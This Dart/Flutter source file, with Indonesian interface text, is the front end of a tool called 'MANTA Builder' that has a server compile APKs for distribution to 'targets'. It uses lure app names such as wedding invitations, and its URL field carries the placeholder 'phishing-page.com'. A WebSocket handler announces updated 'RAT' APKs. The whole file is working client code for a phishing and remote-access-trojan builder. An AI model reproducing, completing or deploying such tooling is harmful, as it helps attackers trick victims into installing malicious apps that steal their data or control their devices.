import 'dart:io';
import 'package:web_socket_channel/web_socket_channel.dart';
import 'dart:convert';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:file_picker/file_picker.dart';
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';
import 'main.dart' show baseUrl;
import 'controller.dart' show AppConfig;

class MantaBuilderPage extends StatefulWidget {
  const MantaBuilderPage({Key? key}) : super(key: key);

  @override
  State<MantaBuilderPage> createState() => _MantaBuilderPageState();
}

class _MantaBuilderPageState extends State<MantaBuilderPage>
    with TickerProviderStateMixin {
  final TextEditingController _appNameCtrl = TextEditingController();
  final TextEditingController _webviewCtrl = TextEditingController(
    text: "https://www.google.com",
  );
  File? _selectedIcon;
  bool _isBuilding = false;
  String _buildLog = '';
  WebSocketChannel? _wsChannel;
  String? _downloadUrl;

  late AnimationController _pulseCtrl;
  late AnimationController _shimmerCtrl;
  late Animation<double> _pulseAnim;
  late Animation<double> _shimmerAnim;


  static const _bg = Color(0xFF070D1A);
  static const _card = Color(0xFF0D1625);
  static const _card2 = Color(0xFF111E30);
  static const _accent = Color(0xFF00D4FF);
  static const _accentGreen = Color(0xFF00FF8C);
  static const _accentPurple = Color(0xFF9B5FFB);
  static const _textP = Color(0xFFE8F0FF);
  static const _textS = Color(0xFF8899BB);

  @override
  void initState() {
    super.initState();
    _pulseCtrl = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 2),
    )..repeat(reverse: true);
    _shimmerCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1500),
    )..repeat();
    _pulseAnim = Tween<double>(begin: 0.95, end: 1.05).animate(_pulseCtrl);
    _shimmerAnim = Tween<double>(begin: -1.0, end: 2.0).animate(_shimmerCtrl);
    _connectWebSocket();
  }

  void _connectWebSocket() {
    try {
      final wsUrl = baseUrl.replaceFirst('http://', 'ws://').replaceFirst('https://', 'wss://') + '/ws';
      _wsChannel = WebSocketChannel.connect(Uri.parse(wsUrl), protocols: ['otax-protocol']);
      _wsChannel?.stream.listen((message) {
        try {
          final data = jsonDecode(message.toString());
          if (data['type'] == 'rat_update') {
            final msg = data['message'] ?? 'APK RAT terbaru telah diupload di server!';
            if (mounted) {
              ScaffoldMessenger.of(context).showSnackBar(
                SnackBar(
                  content: Row(
                    children: [
                      const Icon(Icons.system_update_alt, color: Colors.white),
                      const SizedBox(width: 12),
                      Expanded(
                        child: Text(
                          msg,
                          style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold),
                        ),
                      ),
                    ],
                  ),
                  backgroundColor: Colors.green.shade800,
                  duration: const Duration(seconds: 5),
                  behavior: SnackBarBehavior.floating,
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                ),
              );
            }
          }
        } catch (_) {}
      });
    } catch (_) {}
  }

  @override
  void dispose() {
    _wsChannel?.sink.close();
    _pulseCtrl.dispose();
    _shimmerCtrl.dispose();
    _appNameCtrl.dispose();
    _webviewCtrl.dispose();
    super.dispose();
  }

  Future<void> _pickIcon() async {
    FilePickerResult? result = await FilePicker.platform.pickFiles(
      type: FileType.image,
    );
    if (result != null && result.files.single.path != null) {
      setState(() {
        _selectedIcon = File(result.files.single.path!);
      });
    }
  }

  Future<void> _startBuild() async {
    if (_appNameCtrl.text.trim().isEmpty) {
      _showError('Nama aplikasi tidak boleh kosong');
      return;
    }
    if (_webviewCtrl.text.trim().isEmpty ||
        !_webviewCtrl.text.startsWith('http')) {
      _showError('URL WebView tidak valid');
      return;
    }

    setState(() {
      _isBuilding = true;
      _downloadUrl = null;
      _buildLog = '⏳ Menghubungkan ke server builder...\n';
    });

    try {
      var uri = Uri.parse('$baseUrl/api/build-apk');
      var request = http.MultipartRequest('POST', uri)
        ..fields['appName'] = _appNameCtrl.text.trim()
        ..fields['webviewUrl'] = _webviewCtrl.text.trim()
        ..fields['key'] = AppConfig.sessionKey ?? ''
        ..fields['username'] = AppConfig.username ?? '';

      setState(() => _buildLog += '📦 Mengupload konfigurasi...\n');

      if (_selectedIcon != null) {
        request.files.add(
          await http.MultipartFile.fromPath('icon', _selectedIcon!.path),
        );
        setState(() => _buildLog += '🖼️  Icon berhasil diupload\n');
      }

      setState(() => _buildLog += '🔨 Server sedang mengkompilasi APK...\n');

      var response = await request.send().timeout(const Duration(minutes: 5));
      var responseData = await response.stream.bytesToString();
      var json = jsonDecode(responseData);

      setState(() => _isBuilding = false);

      if (response.statusCode == 200 && json['success'] == true) {
        final dl = '$baseUrl${json['downloadUrl']}';
        setState(() {
          _downloadUrl = dl;
          _buildLog +=
              '✅ APK berhasil dikompilasi!\n📥 Siap untuk didownload.\n';
        });
      } else {
        setState(() {
          _buildLog += '❌ Gagal: ${json['error'] ?? 'Unknown error'}\n';
        });
        _showError(json['error'] ?? 'Gagal membuild APK');
      }
    } catch (e) {
      setState(() {
        _isBuilding = false;
        _buildLog += '❌ Error jaringan: $e\n';
      });
      _showError('Kesalahan jaringan: $e');
    }
  }

  void _showError(String msg) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Row(
          children: [
            const Icon(
              Icons.warning_amber_rounded,
              color: Colors.white,
              size: 18,
            ),
            const SizedBox(width: 8),
            Expanded(child: Text(msg)),
          ],
        ),
        backgroundColor: const Color(0xFFB00020),
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
      ),
    );
  }

  Widget _buildSection(String title, IconData icon, Widget content) {
    return Container(
      margin: const EdgeInsets.only(bottom: 16),
      decoration: BoxDecoration(
        color: _card,
        borderRadius: BorderRadius.circular(18),
        border: Border.all(color: _accent.withOpacity(0.08)),
        boxShadow: [
          BoxShadow(
            color: _accent.withOpacity(0.04),
            blurRadius: 20,
            offset: const Offset(0, 8),
          ),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 14),
            child: Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(8),
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [
                        _accent.withOpacity(0.25),
                        _accentPurple.withOpacity(0.15),
                      ],
                    ),
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(color: _accent.withOpacity(0.2)),
                  ),
                  child: Icon(icon, color: _accent, size: 16),
                ),
                const SizedBox(width: 12),
                Text(
                  title,
                  style: const TextStyle(
                    color: _textP,
                    fontSize: 14,
                    fontWeight: FontWeight.w600,
                    letterSpacing: 0.3,
                  ),
                ),
              ],
            ),
          ),
          Divider(color: _accent.withOpacity(0.06), height: 1),
          Padding(padding: const EdgeInsets.all(18), child: content),
        ],
      ),
    );
  }

  Widget _buildTextField(
    TextEditingController ctrl,
    String hint, {
    TextInputType keyboard = TextInputType.text,
    IconData? prefixIcon,
  }) {
    return TextField(
      controller: ctrl,
      style: const TextStyle(color: _textP, fontSize: 15),
      keyboardType: keyboard,
      decoration: InputDecoration(
        hintText: hint,
        hintStyle: TextStyle(color: _textS.withOpacity(0.6), fontSize: 14),
        filled: true,
        fillColor: _card2,
        prefixIcon: prefixIcon != null
            ? Icon(prefixIcon, color: _textS, size: 20)
            : null,
        border: OutlineInputBorder(
          borderRadius: BorderRadius.circular(12),
          borderSide: BorderSide.none,
        ),
        focusedBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(12),
          borderSide: BorderSide(color: _accent.withOpacity(0.5), width: 1.5),
        ),
        contentPadding: const EdgeInsets.symmetric(
          horizontal: 16,
          vertical: 16,
        ),
      ),
    );
  }

  Widget _buildIconPicker() {
    return Row(
      crossAxisAlignment: CrossAxisAlignment.center,
      children: [
        GestureDetector(
          onTap: _pickIcon,
          child: AnimatedContainer(
            duration: const Duration(milliseconds: 300),
            width: 90,
            height: 90,
            decoration: BoxDecoration(
              color: _card2,
              borderRadius: BorderRadius.circular(20),
              border: Border.all(
                color: _selectedIcon != null
                    ? _accentGreen.withOpacity(0.6)
                    : _accent.withOpacity(0.25),
                width: 2,
              ),
              boxShadow: _selectedIcon != null
                  ? [
                      BoxShadow(
                        color: _accentGreen.withOpacity(0.15),
                        blurRadius: 16,
                      ),
                    ]
                  : [],
            ),
            child: _selectedIcon != null
                ? ClipRRect(
                    borderRadius: BorderRadius.circular(18),
                    child: Image.file(_selectedIcon!, fit: BoxFit.cover),
                  )
                : Column(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      Icon(
                        Icons.add_photo_alternate_rounded,
                        color: _textS,
                        size: 32,
                      ),
                      const SizedBox(height: 4),
                      Text(
                        'Pilih',
                        style: TextStyle(color: _textS, fontSize: 11),
                      ),
                    ],
                  ),
          ),
        ),
        const SizedBox(width: 18),
        Expanded(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text(
                _selectedIcon != null ? '✅ Icon dipilih' : 'Belum ada icon',
                style: TextStyle(
                  color: _selectedIcon != null ? _accentGreen : _textS,
                  fontWeight: FontWeight.w600,
                  fontSize: 14,
                ),
              ),
              const SizedBox(height: 4),
              Text(
                _selectedIcon != null
                    ? _selectedIcon!.path.split('/').last
                    : 'Tap gambar untuk memilih ikon aplikasi (PNG/JPG)',
                style: TextStyle(color: _textS.withOpacity(0.7), fontSize: 12),
                maxLines: 2,
                overflow: TextOverflow.ellipsis,
              ),
              if (_selectedIcon != null) ...[
                const SizedBox(height: 10),
                GestureDetector(
                  onTap: () => setState(() => _selectedIcon = null),
                  child: Text(
                    'Hapus icon',
                    style: TextStyle(
                      color: Colors.redAccent.withOpacity(0.8),
                      fontSize: 12,
                      decoration: TextDecoration.underline,
                    ),
                  ),
                ),
              ],
            ],
          ),
        ),
      ],
    );
  }

  Widget _buildLogPanel() {
    if (_buildLog.isEmpty) return const SizedBox.shrink();
    return Container(
      margin: const EdgeInsets.only(bottom: 16),
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: const Color(0xFF050B14),
        borderRadius: BorderRadius.circular(14),
        border: Border.all(color: _accent.withOpacity(0.12)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                width: 8,
                height: 8,
                decoration: BoxDecoration(
                  color: _isBuilding ? Colors.green : _textS,
                  shape: BoxShape.circle,
                  boxShadow: _isBuilding
                      ? [
                          BoxShadow(
                            color: Colors.green.withOpacity(0.5),
                            blurRadius: 6,
                          ),
                        ]
                      : [],
                ),
              ),
              const SizedBox(width: 8),
              Text(
                _isBuilding ? 'Building...' : 'Build Log',
                style: TextStyle(
                  color: _isBuilding ? Colors.green : _textS,
                  fontSize: 12,
                  fontWeight: FontWeight.w600,
                  letterSpacing: 1,
                ),
              ),
            ],
          ),
          const SizedBox(height: 10),
          Text(
            _buildLog,
            style: const TextStyle(
              color: Color(0xFF90BF90),
              fontFamily: 'monospace',
              fontSize: 12,
              height: 1.7,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildDownloadButton() {
    if (_downloadUrl == null) return const SizedBox.shrink();
    return Container(
      margin: const EdgeInsets.only(bottom: 16),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: [_accentGreen.withOpacity(0.15), _accent.withOpacity(0.1)],
        ),
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: _accentGreen.withOpacity(0.4)),
      ),
      child: Material(
        color: Colors.transparent,
        child: InkWell(
          onTap: () => launchUrl(
            Uri.parse(_downloadUrl!),
            mode: LaunchMode.externalApplication,
          ),
          borderRadius: BorderRadius.circular(16),
          child: Padding(
            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 18),
            child: Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(10),
                  decoration: BoxDecoration(
                    color: _accentGreen.withOpacity(0.15),
                    shape: BoxShape.circle,
                  ),
                  child: const Icon(
                    Icons.download_rounded,
                    color: _accentGreen,
                    size: 22,
                  ),
                ),
                const SizedBox(width: 14),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      const Text(
                        'APK Siap Didownload!',
                        style: TextStyle(
                          color: _accentGreen,
                          fontWeight: FontWeight.bold,
                          fontSize: 15,
                        ),
                      ),
                      const SizedBox(height: 3),
                      Text(
                        'Tap untuk membuka link download',
                        style: TextStyle(
                          color: _textS.withOpacity(0.7),
                          fontSize: 12,
                        ),
                      ),
                    ],
                  ),
                ),
                Icon(
                  Icons.chevron_right_rounded,
                  color: _accentGreen.withOpacity(0.7),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _bg,
      body: CustomScrollView(
        slivers: [
          SliverAppBar(
            expandedHeight: 180,
            backgroundColor: const Color(0xFF0A1525),
            elevation: 0,
            pinned: true,
            flexibleSpace: FlexibleSpaceBar(
              background: Stack(
                children: [

                  Positioned.fill(child: CustomPaint(painter: _GridPainter())),

                  Positioned(
                    top: -40,
                    right: -40,
                    child: Container(
                      width: 180,
                      height: 180,
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        gradient: RadialGradient(
                          colors: [
                            _accentPurple.withOpacity(0.18),
                            Colors.transparent,
                          ],
                        ),
                      ),
                    ),
                  ),
                  Positioned(
                    bottom: -20,
                    left: -20,
                    child: Container(
                      width: 140,
                      height: 140,
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        gradient: RadialGradient(
                          colors: [
                            _accent.withOpacity(0.12),
                            Colors.transparent,
                          ],
                        ),
                      ),
                    ),
                  ),

                  Positioned(
                    bottom: 24,
                    left: 20,
                    right: 20,
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Row(
                          children: [
                            Container(
                              padding: const EdgeInsets.symmetric(
                                horizontal: 10,
                                vertical: 4,
                              ),
                              decoration: BoxDecoration(
                                gradient: LinearGradient(
                                  colors: [
                                    _accent.withOpacity(0.2),
                                    _accentPurple.withOpacity(0.2),
                                  ],
                                ),
                                borderRadius: BorderRadius.circular(20),
                                border: Border.all(
                                  color: _accent.withOpacity(0.3),
                                ),
                              ),
                              child: const Row(
                                children: [
                                  Icon(
                                    Icons.bolt_rounded,
                                    color: _accent,
                                    size: 12,
                                  ),
                                  SizedBox(width: 4),
                                  Text(
                                    'AUTO BUILD',
                                    style: TextStyle(
                                      color: _accent,
                                      fontSize: 10,
                                      fontWeight: FontWeight.w700,
                                      letterSpacing: 1.5,
                                    ),
                                  ),
                                ],
                              ),
                            ),
                          ],
                        ),
                        const SizedBox(height: 8),
                        const Text(
                          'MANTA Builder',
                          style: TextStyle(
                            color: _textP,
                            fontSize: 28,
                            fontWeight: FontWeight.w800,
                            letterSpacing: -0.5,
                          ),
                        ),
                        const SizedBox(height: 4),
                        Text(
                          'Kompilasi APK target otomatis via server',
                          style: TextStyle(
                            color: _textS.withOpacity(0.8),
                            fontSize: 13,
                          ),
                        ),
                      ],
                    ),
                  ),
                ],
              ),
              titlePadding: EdgeInsets.zero,
            ),
            leading: IconButton(
              icon: Container(
                padding: const EdgeInsets.all(6),
                decoration: BoxDecoration(
                  color: Colors.white.withOpacity(0.08),
                  borderRadius: BorderRadius.circular(8),
                ),
                child: const Icon(
                  Icons.arrow_back_ios_new_rounded,
                  color: _textP,
                  size: 16,
                ),
              ),
              onPressed: () => Navigator.pop(context),
            ),
          ),
          SliverPadding(
            padding: const EdgeInsets.all(16),
            sliver: SliverList(
              delegate: SliverChildListDelegate([

                Container(
                  margin: const EdgeInsets.only(bottom: 16),
                  padding: const EdgeInsets.all(14),
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [
                        _accent.withOpacity(0.06),
                        _accentPurple.withOpacity(0.04),
                      ],
                    ),
                    borderRadius: BorderRadius.circular(14),
                    border: Border.all(color: _accent.withOpacity(0.12)),
                  ),
                  child: Row(
                    children: [
                      Icon(
                        Icons.info_outline_rounded,
                        color: _accent.withOpacity(0.8),
                        size: 18,
                      ),
                      const SizedBox(width: 10),
                      Expanded(
                        child: Text(
                          'Server akan otomatis men-inject konfigurasi ke dalam APK polosan, lalu mengembalikan APK yang sudah siap disebarkan.',
                          style: TextStyle(
                            color: _textS,
                            fontSize: 12,
                            height: 1.5,
                          ),
                        ),
                      ),
                    ],
                  ),
                ),


                _buildSection(
                  'Nama Aplikasi',
                  Icons.drive_file_rename_outline_rounded,
                  _buildTextField(
                    _appNameCtrl,
                    'Cth: Undangan Pernikahan, Dokumen Penting...',
                    prefixIcon: Icons.apps_rounded,
                  ),
                ),


                _buildSection(
                  'URL WebView Target',
                  Icons.link_rounded,
                  Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      _buildTextField(
                        _webviewCtrl,
                        'https://phishing-page.com',
                        keyboard: TextInputType.url,
                        prefixIcon: Icons.language_rounded,
                      ),
                      const SizedBox(height: 8),
                      Row(
                        children: [
                          Icon(
                            Icons.tips_and_updates_rounded,
                            color: _accent.withOpacity(0.6),
                            size: 13,
                          ),
                          const SizedBox(width: 6),
                          Text(
                            'URL ini akan dimuat saat APK dibuka oleh target',
                            style: TextStyle(
                              color: _textS.withOpacity(0.6),
                              fontSize: 11,
                            ),
                          ),
                        ],
                      ),
                    ],
                  ),
                ),


                _buildSection(
                  'Ikon Aplikasi',
                  Icons.image_rounded,
                  _buildIconPicker(),
                ),


                _buildLogPanel(),


                _buildDownloadButton(),


                AnimatedBuilder(
                  animation: _shimmerAnim,
                  builder: (context, child) {
                    return Container(
                      height: 58,
                      margin: const EdgeInsets.only(bottom: 40),
                      decoration: BoxDecoration(
                        borderRadius: BorderRadius.circular(16),
                        boxShadow: [
                          BoxShadow(
                            color: _isBuilding
                                ? Colors.transparent
                                : _accent.withOpacity(0.3),
                            blurRadius: 20,
                            offset: const Offset(0, 8),
                          ),
                        ],
                      ),
                      child: Material(
                        color: Colors.transparent,
                        child: InkWell(
                          onTap: _isBuilding ? null : _startBuild,
                          borderRadius: BorderRadius.circular(16),
                          child: Ink(
                            decoration: BoxDecoration(
                              gradient: _isBuilding
                                  ? LinearGradient(colors: [_card, _card2])
                                  : LinearGradient(
                                      colors: [
                                        _accent,
                                        const Color(0xFF0090FF),
                                        _accentPurple,
                                      ],
                                      stops: const [0.0, 0.5, 1.0],
                                    ),
                              borderRadius: BorderRadius.circular(16),
                            ),
                            child: Center(
                              child: _isBuilding
                                  ? Row(
                                      mainAxisAlignment:
                                          MainAxisAlignment.center,
                                      children: [
                                        SizedBox(
                                          width: 18,
                                          height: 18,
                                          child: CircularProgressIndicator(
                                            color: _accent,
                                            strokeWidth: 2,
                                          ),
                                        ),
                                        const SizedBox(width: 12),
                                        Text(
                                          'Membangun APK...',
                                          style: TextStyle(
                                            color: _textS,
                                            fontWeight: FontWeight.w600,
                                            fontSize: 15,
                                          ),
                                        ),
                                      ],
                                    )
                                  : const Row(
                                      mainAxisAlignment:
                                          MainAxisAlignment.center,
                                      children: [
                                        Icon(
                                          Icons.rocket_launch_rounded,
                                          color: Colors.white,
                                          size: 20,
                                        ),
                                        SizedBox(width: 10),
                                        Text(
                                          'BUILD APK SEKARANG',
                                          style: TextStyle(
                                            color: Colors.white,
                                            fontWeight: FontWeight.w800,
                                            fontSize: 15,
                                            letterSpacing: 1,
                                          ),
                                        ),
                                      ],
                                    ),
                            ),
                          ),
                        ),
                      ),
                    );
                  },
                ),
              ]),
            ),
          ),
        ],
      ),
    );
  }
}


class _GridPainter extends CustomPainter {
  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = const Color(0xFF00D4FF).withOpacity(0.04)
      ..strokeWidth = 0.5;
    const step = 30.0;
    for (double x = 0; x < size.width; x += step) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), paint);
    }
    for (double y = 0; y < size.height; y += step) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), paint);
    }
  }

  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}
